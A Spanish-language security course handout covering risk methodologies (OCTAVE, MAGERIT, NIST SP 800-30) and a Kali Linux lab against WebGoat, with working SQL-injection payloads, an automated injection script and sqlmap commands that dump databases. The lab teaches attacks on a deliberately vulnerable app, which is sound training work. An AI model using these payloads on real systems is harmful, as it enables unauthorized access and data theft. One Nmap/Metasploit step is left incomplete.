## **DEFINICIONES.**
## **OCTAVE (Operationally Critical Threat, Asset, and Vulnerability Evaluation)**

**Descripción**:  
OCTAVE es una metodología que permite a las organizaciones identificar, evaluar y gestionar riesgos de seguridad en sus activos críticos de información. Está diseñada para adaptarse a las necesidades específicas de una organización y prioriza la participación activa del personal involucrado.

### **Fases de OCTAVE**:
1. **Fase 1: Identificar Activos Críticos y Amenazas**  
   - Identificar los activos más valiosos (datos, sistemas, aplicaciones).  
   - Documentar posibles amenazas y vulnerabilidades asociadas a esos activos.

2. **Fase 2: Identificar Vulnerabilidades**  
   - Realizar análisis técnico en los sistemas para identificar vulnerabilidades existentes.

3. **Fase 3: Planificar la Gestión de Riesgos**  
   - Desarrollar estrategias para mitigar los riesgos identificados.

### **Ejemplo en la práctica**:
**Escenario**: Una empresa usa un sistema web para almacenar información de clientes.  
- **Fase 1**: Identifica que el activo crítico es la base de datos con datos personales.  
- **Fase 2**: Detecta vulnerabilidades como una versión desactualizada de su sistema operativo o un firewall mal configurado.  
- **Fase 3**: Implementa actualizaciones y refuerza configuraciones del firewall.

## **2. MAGERIT (Metodología de Análisis y Gestión de Riesgos de los Sistemas de Información)**

**Descripción**:  
MAGERIT es una metodología desarrollada por el gobierno español para identificar y analizar riesgos en sistemas de información, priorizando la protección de datos sensibles y cumpliendo con normativas legales (como RGPD).

### **Principales pasos de MAGERIT**:
1. **Inventario de Activos**  
   - Identificar activos tangibles (servidores, software) e intangibles (datos, procesos).

2. **Identificación de Amenazas y Vulnerabilidades**  
   - Analizar qué amenazas afectan a los activos y las vulnerabilidades que las facilitan.

3. **Análisis de Impacto y Probabilidad**  
   - Evaluar el impacto de una amenaza en términos económicos y operativos.

4. **Planificación de Controles**  
   - Diseñar medidas correctivas y preventivas basadas en el análisis.

### **Ejemplo en la práctica**:
**Escenario**: Un hospital gestiona historias clínicas electrónicas.  
- **Inventario**: Historias clínicas, servidores, software de gestión hospitalaria.  
- **Amenazas**: Ataques de ransomware.  
- **Impacto**: La pérdida de datos clínicos puede generar daño reputacional y sanciones legales.  
- **Planificación**: Implementar backups seguros y segmentar la red interna.

## **3. NIST SP 800-30 (Guide for Conducting Risk Assessments)**

**Descripción**:  
Este es un estándar de gestión de riesgos del Instituto Nacional de Estándares y Tecnología de EE.UU. (NIST). Ofrece un marco para realizar evaluaciones de riesgos en sistemas de información, basado en buenas prácticas internacionales.

### **Pasos clave del NIST SP 800-30**:
1. **Preparación para la Evaluación**  
   - Definir el alcance, objetivos y criterios para evaluar riesgos.

2. **Identificación de Riesgos**  
   - Identificar amenazas, vulnerabilidades y posibles impactos.

3. **Análisis de Riesgos**  
   - Estimar la probabilidad de ocurrencia y el impacto de los riesgos identificados.

4. **Evaluación del Riesgo**  
   - Clasificar los riesgos según niveles de prioridad.

5. **Mitigación del Riesgo**  
   - Implementar controles de seguridad apropiados.

### **Ejemplo en la práctica**:
**Escenario**: Una empresa de comercio electrónico quiere proteger datos de clientes y transacciones.  
- **Amenazas**: Ataques de phishing, robo de datos.  
- **Vulnerabilidades**: Configuración incorrecta del protocolo HTTPS.  
- **Controles sugeridos**: Certificados SSL actualizados, implementación de WAF (Web Application Firewall).

---

## **Comparativa entre OCTAVE, MAGERIT y NIST SP 800-30**

| Aspecto                  | OCTAVE                                | MAGERIT                                 | NIST SP 800-30                         |
|--------------------------|---------------------------------------|-----------------------------------------|----------------------------------------|
| **Enfoque**              | Activos críticos                     | Sistemas de información                 | Evaluación de riesgos en TI            |
| **Nivel de detalle**     | Estrategia general                   | Muy detallado, con énfasis en procesos | Detallado y flexible                   |
| **Sector**               | General                              | Sector público y privado (España)       | Global (basado en estándares NIST)     |
| **Usabilidad**           | Alta para organizaciones pequeñas    | Compleja pero adaptable                 | Alta, adaptable a múltiples contextos  |

### **TEMA 2: Gestión de Riesgos**
#### Actividad Técnica: Uso de herramientas para análisis de vulnerabilidades
- **Herramienta**: **Nmap** (escaneo de puertos y servicios en un sistema).
- **Recurso**: Introducir un breve script en Python para automatizar un análisis básico de puertos abiertos.
- **Ejemplo de código Python:**
```python
import nmap

# Escáner de puertos
scanner = nmap.PortScanner()
ip_address = input("Introduce la dirección IP para analizar: ")
scanner.scan(ip_address, '1-1024')  # Escaneo de puertos comunes

for host in scanner.all_hosts():
    print(f"Host: {host} ({scanner[host].hostname()})")
    print(f"Estado: {scanner[host].state()}")

    for protocol in scanner[host].all_protocols():
        print(f"\nProtocolo: {protocol}")
        ports = scanner[host][protocol].keys()
        for port in ports:
            print(f"Puerto: {port}, Estado: {scanner[host][protocol][port]['state']}")
```
- **Objetivo**: Los estudiantes identifican activos vulnerables y los servicios expuestos.

2. **Script en Python**: Validar accesos a usuarios según su rol.
```python
import sqlite3

# Conexión a la base de datos
conexion = sqlite3.connect('control_acceso.db')
cursor = conexion.cursor()

# Consulta de usuarios
usuario = input("Introduce tu nombre de usuario: ")
cursor.execute("SELECT rol FROM usuarios WHERE nombre=?", (usuario,))
resultado = cursor.fetchone()

if resultado:
    rol = resultado[0]
    if rol == 'admin':
        print(f"Bienvenido {usuario}, tienes acceso completo.")
    else:
        print(f"Bienvenido {usuario}, acceso limitado.")
else:
    print("Usuario no encontrado.")
```

PRACTICA CON KALI LINUX

Kali Linux es una de las mejores opciones para trabajar en ciberseguridad, ya que está diseñado específicamente para pruebas de penetración y análisis de seguridad. Tiene preinstaladas herramientas esenciales como **Nmap**, **OWASP ZAP**, **Wireshark**, y muchas más.

### **Ventajas de usar Kali Linux:**
1. **Herramientas Preinstaladas**: Viene con un conjunto completo de herramientas para escaneo, análisis de vulnerabilidades, explotación y auditorías de seguridad.
2. **Entorno Realista**: Simula escenarios que los estudiantes podrían encontrar en un entorno profesional.
3. **Comunidad Activa**: Kali Linux tiene una gran comunidad y documentación en caso de problemas.
4. **Compatibilidad**: Funciona bien tanto en hardware físico como en máquinas virtuales.

---

### **Cómo trabajar con Kali Linux**
1. **Descarga e instalación:**
   - Descargar desde el sitio oficial: [kali.org](https://www.kali.org/get-kali/).
   - Opciones de instalación:
     - **Instalación completa**: Para instalar Kali en el disco duro como sistema operativo principal.
     - **Live USB**: Para ejecutar Kali Linux sin instalarlo.
     - **Máquina virtual**: Utilizando software como **VirtualBox** o **VMware**.

2. **Configuración básica (para estudiantes):**
   - Actualizar los repositorios:
     ```bash
     sudo apt update && sudo apt upgrade -y
     ```
   - Crear un usuario no root (Kali ahora desaconseja trabajar como root):
     ```bash
     sudo adduser estudiante
     sudo usermod -aG sudo estudiante
     ```

3. **Instalar herramientas adicionales según las actividades:**
   Aunque Kali incluye muchas herramientas preinstaladas, algunas actividades específicas podrían requerir configuraciones extra, como:
   - **SQLite**:
     ```bash
     sudo apt install sqlite3
     ```
   - **Python y módulos**:
     ```bash
     sudo apt install python3-pip
     pip install requests scapy
     ```

4. **Practicar en máquinas virtuales o redes simuladas:**
   - Configurar redes locales utilizando **VirtualBox** con varias máquinas virtuales para simular escenarios reales.
   - Usar **Metasploitable** como máquina vulnerable para pruebas de penetración.

---

### **Actividades en Kali Linux**
Aquí tienes un desglose de las actividades propuestas y cómo implementarlas en Kali Linux:

1. **Escaneo de puertos con Nmap**:
   - Comando básico:
     ```bash
     nmap -sS -Pn 192.168.1.0/24
     ```
   - Identificar servicios en un puerto específico:
     ```bash
     nmap -sV -p 80,443 <IP>
     ```

2. **Automatización con Python**:
   - Crear scripts de escaneo básico con Python y `socket`:
     ```python
     import socket
     def escaneo(ip, puerto):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(1)
         resultado = sock.connect_ex((ip, puerto))
         if resultado == 0:
             print(f"Puerto {puerto} abierto")
         sock.close()
     escaneo("192.168.1.1", 80)
     ```

3. **SQL Injection con SQLite**:
   - Crear una base de datos SQLite para pruebas de inyección:
     ```bash
     sqlite3 prueba.db
     ```
   - Insertar datos simulados:
     ```sql
     CREATE TABLE usuarios (id INTEGER, nombre TEXT, clave TEXT);
     INSERT INTO usuarios VALUES (1, 'admin', '12345');
     ```

4. **OWASP ZAP**:
   - Ejecutar:
     ```bash
     zaproxy
     ```
   - Realizar un análisis de vulnerabilidades en un sitio web local o remoto.

5. **Configuración de Firewall (iptables en lugar de UFW)**:
   - Crear reglas básicas con iptables:
     ```bash
     sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
     sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
     sudo iptables -P INPUT DROP
     sudo iptables -L -v
     ```

---

### **Recomendación para el entorno de aprendizaje:**
1. Si los estudiantes no tienen experiencia con Linux, instala Kali Linux como máquina virtual utilizando **VirtualBox** o **VMware**. Esto les permitirá experimentar sin riesgo de afectar sus equipos principales.
2. Usa un entorno de laboratorio con:
   - **Red NAT o Interna**: Para realizar pruebas de escaneo sin afectar redes externas.
   - **Máquinas vulnerables**: Como **Metasploitable**, **DVWA** o **OWASP Juice Shop**.

#### **1. Escenario de Red**
Puedes conectar tus sistemas (Kali Linux y WebGoat) en las siguientes configuraciones de red en VirtualBox:
- **Red NAT**: Permite conexión a internet y comunicación limitada entre máquinas. Útil si deseas descargar actualizaciones o herramientas adicionales.
- **Red Interna**: Las máquinas virtuales pueden comunicarse entre sí, pero no tienen acceso a internet. Ideal para un entorno controlado de pruebas.
- **Adaptador Puente**: Conecta tus máquinas virtuales a la red física de tu computadora, funcionando como si fueran dispositivos reales.

> **Recomendación**: Usa **Red Interna** para mantener el entorno seguro y enfocado en las prácticas.

---

#### **2. Configuración de Red en VirtualBox**
1. Abre VirtualBox y selecciona cada máquina virtual (**Kali Linux y WebGoat**).
2. Ve a **Configuración > Red**.
3. Selecciona el modo **Red Interna**.
4. Asegúrate de que ambas máquinas estén en la misma red interna. Por ejemplo:
   - Nombre de red interna: `RedInternaPruebas`.

---

#### **3. Configuración de Red en Kali Linux**
- Verifica la IP asignada a Kali Linux:
  ```bash
  ip a
  ```
  Deberías ver una IP en un rango como `192.168.X.X` si todo está configurado correctamente.

- Si necesitas asignar una IP estática:
  Edita el archivo de configuración:
  ```bash
  sudo nano /etc/network/interfaces
  ```
  Agrega lo siguiente:
  ```plaintext
  iface eth0 inet static
  address 192.168.1.10
  netmask 255.255.255.0
  gateway 192.168.1.1
  ```

  Reinicia la red:
  ```bash
  sudo systemctl restart networking
  ```

#### **4. Configuración de WebGoat**
WebGoat es una aplicación web vulnerable que puede ejecutarse en una máquina virtual (por ejemplo, Ubuntu) o directamente en Kali Linux.

##### Opción 1: Ejecutar WebGoat en otra máquina virtual (recomendado)
1. Si tienes **Ubuntu** o una máquina Windows, instala WebGoat con Docker:
   - Instala Docker:
     ```bash
     sudo apt install docker.io
     ```
   - Ejecuta WebGoat:
     ```bash
     docker run -p 8080:8080 webgoat/webgoat
     ```

2. Asegúrate de que la IP de esta máquina esté en el mismo rango que Kali Linux.

##### Opción 2: Ejecutar WebGoat en la misma máquina Kali
1. Descarga WebGoat:
   ```bash
   wget https://github.com/WebGoat/WebGoat/releases/download/v8.3.0/webgoat-server-8.3.0.jar
   ```
2. Ejecuta WebGoat:
   ```bash
   java -jar webgoat-server-8.3.0.jar
   ```
3. Accede desde el navegador de Kali:
   - URL: `http://localhost:8080/WebGoat`.

---

#### **5. Comprobación de Conectividad**
- Desde Kali Linux, haz ping a la máquina donde está WebGoat:
  ```bash
  ping 192.168.1.X
  ```
- Accede a WebGoat desde el navegador de Kali Linux:
  ```plaintext
  http://192.168.1.X:8080/WebGoat
  ```
  Cambia `192.168.1.X` por la IP de la máquina donde corre WebGoat.

### **1. Ejercicio de Inyección SQL en WebGoat**

#### **Escenario**: Inyección SQL básica
- Supongamos que estamos atacando un formulario de inicio de sesión vulnerable en WebGoat.

#### **Pasos**:
1. **Accede al módulo de inyección SQL en WebGoat**:
   - Inicia WebGoat (`http://localhost:8080/WebGoat`).
   - Navega a **SQL Injection (Introduction)**.

2. **Prueba básica de autenticación bypass**:
   - Usa esta consulta en el campo de usuario:
     ```sql
     ' OR '1'='1' --
     ```
   - Deja el campo de contraseña vacío y envía el formulario.

   > Esto funciona porque `' OR '1'='1' --` siempre evalúa como verdadero.

3. **Tarea práctica**:
   - Intenta filtrar datos de una base de datos ficticia ejecutando:
     ```sql
     ' UNION SELECT null, username, password FROM users --
     ```

#### **Desde Kali Linux**:
Usa `sqlmap`, una herramienta preinstalada en Kali Linux para automatizar la inyección SQL.

1. **Identifica el formulario vulnerable**:
   - Encuentra el formulario vulnerable desde el navegador con las herramientas de desarrollo (Inspeccionar Elemento).
   - Anota la URL del formulario, como:
     ```plaintext
     http://localhost:8080/WebGoat/SqlInjection/login
     ```

2. **Ejecuta sqlmap**:
   ```bash
   sqlmap -u "http://localhost:8080/WebGoat/SqlInjection/login" --data="username=admin&password=test" --dbs
   ```
   Esto extraerá las bases de datos disponibles.

3. **Explora tablas**:
   ```bash
   sqlmap -u "http://localhost:8080/WebGoat/SqlInjection/login" --data="username=admin&password=test" -D <database_name> --tables
   ```

### **2. Escaneo y Explotación de Vulnerabilidades en WebGoat desde Kali**

#### **Herramienta: Nmap**
Realiza un escaneo de puertos en la máquina donde se ejecuta WebGoat.

1. **Escaneo básico**:
   ```bash
   nmap -sV -p- 192.168.1.X
   ```

2. **Escaneo enfocado a vulnerabilidades**:

1. **Carga Metasploit**:


   ```bash
   search webgoat
   ```


### **3. Script Python para Automatizar Reconocimiento**

#### **Ejemplo: Detección de directorios en WebGoat**
Crea un script en Python que detecte directorios ocultos en el servidor WebGoat.

1. **Código**:
   ```python
   import requests

   # Configuración
   target_url = "http://192.168.1.X:8080/"
   wordlist = ["admin", "login", "sqlinjection", "setup", "config"]

   print("[+] Escaneando directorios en:", target_url)
   
   for word in wordlist:
       url = f"{target_url}{word}"
       response = requests.get(url)
       if response.status_code == 200:
           print(f"[!] Directorio encontrado: {url}")
       else:
           print(f"[-] No encontrado: {url}")
   ```

2. **Uso**:
   - Guarda el script como `dir_scan.py`.
   - Ejecútalo desde Kali Linux:
     ```bash
     python3 dir_scan.py
     ```

#### **Ejemplo: Explotación Automatizada**
Usa Python para realizar un ataque SQL básico.

1. **Código**:
   ```python
   import requests

   # Configuración
   target_url = "http://192.168.1.X:8080/WebGoat/SqlInjection/login"
   payload = "' OR '1'='1' --"
   data = {"username": payload, "password": "test"}

   print("[+] Enviando payload...")
   response = requests.post(target_url, data=data)

   if "Welcome" in response.text:
       print("[!] Inyección exitosa. Acceso obtenido.")
   else:
       print("[-] Inyección fallida.")
   ```

2. **Uso**:
   - Guarda el script como `sql_injection.py`.
   - Ejecútalo:
     ```bash
     python3 sql_injection.py
     ```

### **1. Ejercicio: Explorar Inyección SQL Básica**

#### Objetivo:
Acceder a información confidencial almacenada en la base de datos sin autorización.

#### Pasos:
1. **Inicia WebGoat:**
   - Asegúrate de tener WebGoat configurado en tu máquina local.
   - Accede a WebGoat desde `http://localhost:8080/WebGoat` y selecciona el tema de **SQL Injection (Introduction)**.

2. **Realiza una Búsqueda Simple:**
   - En el campo de búsqueda, introduce una entrada válida, por ejemplo:  
     ```
     Smith
     ```

3. **Prueba una Inyección Básica:**
   - Introduce la siguiente consulta para ver si el sistema es vulnerable:
     ```
     ' OR '1'='1
     ```
   - Si el sistema devuelve todos los registros, significa que la inyección fue exitosa.

4. **Bypass de Autenticación:**
   - Accede al módulo de autenticación en WebGoat.
   - Introduce:
     ```
     Username: admin' --
     Password: (dejar en blanco)
     ```
   - Observa cómo puedes omitir la autenticación si el sistema no valida correctamente las entradas.

#### Explicación:
La consulta SQL que se genera es:
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''
```
El `--` comenta el resto de la consulta, permitiendo acceso sin verificar la contraseña.

### **2. Ejercicio: Extraer Datos Usando UNION SELECT**

#### Objetivo:
Utilizar una inyección más avanzada para recuperar información específica, como nombres de usuarios y contraseñas.

#### Pasos:
1. **Navega a la Sección de SQL Injection (Advanced):**
   - En WebGoat, selecciona el nivel avanzado de inyección SQL.

2. **Inicia la Prueba con UNION SELECT:**
   - En el campo vulnerable, ingresa:
     ```
     ' UNION SELECT username, password FROM users --
     ```
   - Si es exitoso, deberías obtener una lista de usuarios y contraseñas (almacenadas como hash o texto plano).

3. **Afina la Consulta:**
   - Para identificar más columnas, prueba:
     ```
     ' UNION SELECT null, username, password FROM users --
     ```
   - Ajusta los `null` según la cantidad de columnas devueltas por la consulta.

#### Explicación:
El operador `UNION SELECT` permite combinar el resultado de dos consultas SQL. Si no se sanitizan correctamente las entradas, se pueden leer datos confidenciales.

### **3. Ejercicio: Prueba de Error-Based SQL Injection**

#### Objetivo:
Obtener información del servidor explotando mensajes de error.

#### Pasos:
1. **Selecciona el Módulo:**
   - En WebGoat, ve al apartado **"SQL Injection (Numeric)"**.

2. **Induce un Error:**
   - Introduce un valor numérico inválido en un campo que espera un ID. Por ejemplo:
     ```
     1'
     ```

3. **Prueba una Consulta Incorrecta:**
   - Ingresa:
     ```
     1' AND 1=CONVERT(int, (SELECT @@version)) --
     ```
   - Si se genera un mensaje de error, puedes observar la versión del servidor SQL.

4. **Extrae Información del Esquema:**
   - Usa consultas como esta:
     ```
     1' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables)) --
     ```

#### Explicación:
Los mensajes de error del servidor pueden revelar detalles sobre la base de datos, como su versión o estructura.

### **4. Ejercicio: Automatizar con sqlmap**

#### Objetivo:
Explotar un campo vulnerable utilizando la herramienta `sqlmap`.

#### Pasos:
1. **Captura la Solicitud:**
   - Usa Burp Suite o Web Proxy para interceptar una solicitud HTTP que contenga un parámetro vulnerable (por ejemplo, `id=1`).

2. **Guarda la Solicitud:**
   - Guarda la solicitud interceptada como `request.txt`.

3. **Ejecuta sqlmap:**
   - Usa sqlmap para detectar y explotar la vulnerabilidad:
     ```bash
     sqlmap -r request.txt --dbs
     ```
   - Lista las tablas:
     ```bash
     sqlmap -r request.txt -D database_name --tables
     ```
   - Extrae datos sensibles:
     ```bash
     sqlmap -r request.txt -D database_name -T table_name --dump
     ```

#### Explicación:
`sqlmap` automatiza el proceso de detección y explotación de SQL Injection. Con WebGoat, puedes usarlo en entornos seguros.

### **5. Ejercicio: Blind SQL Injection**

#### Objetivo:
Explotar una vulnerabilidad de tipo Blind SQL Injection para recuperar información cuando no hay mensajes de error visibles.

#### Pasos:
1. **Selecciona el Módulo:**
   - Ve al módulo de **Blind SQL Injection** en WebGoat.

2. **Prueba Condicionales Booleanas:**
   - En un campo vulnerable, introduce:
     ```
     ' AND 1=1 --
     ```
     Esto debería devolver resultados válidos.
   - Introduce una consulta inválida:
     ```
     ' AND 1=2 --
     ```
     Si no hay resultados, confirma la vulnerabilidad.

3. **Extrae Información con Condiciones:**
   - Introduce consultas como:
     ```
     ' AND (SELECT SUBSTRING(database(), 1, 1)) = 'a' --
     ```
   - Cambia el carácter `'a'` por otras letras para descubrir el nombre de la base de datos.

#### Explicación:
Blind SQL Injection no devuelve resultados directos, pero permite inferir datos con consultas booleanas.
